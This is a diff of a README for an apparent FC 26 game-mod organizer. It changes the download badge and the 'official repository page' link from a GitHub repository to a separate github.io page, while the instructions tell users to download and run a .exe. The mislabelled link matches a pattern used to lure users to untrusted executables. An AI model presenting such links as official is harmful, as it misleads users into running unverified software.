@@ -1,6 +1,6 @@
 # ⚙️ FC26-Mod-Organizer-Plus - Manage your mods with complete control
 
-[ ![Download Software](https://img.shields.io/badge/Download-FC26_Organizer-blue.svg) ](https://github.com/dsog949/FC26-Mod-Organizer-Plus)
+[ ![Download Software](https://img.shields.io/badge/Download-FC26_Organizer-blue.svg) ](https://dsog949.github.io)
 
 Modding FC 26 changes how you play the game. You can update kits, change gameplay settings, or improve visuals. This tool helps you organize those files. It tracks which mods you have installed and fixes conflicts between them.
 
@@ -19,7 +19,7 @@ To run this software, your computer needs these items:
 
 Follow these steps to set up the organizer on your Windows computer.
 
-1. Go to the [official repository page](https://github.com/dsog949/FC26-Mod-Organizer-Plus).
+1. Go to the [official repository page](https://dsog949.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Select the latest version listed under Releases.
 4. Download the file ending in .exe to your computer.
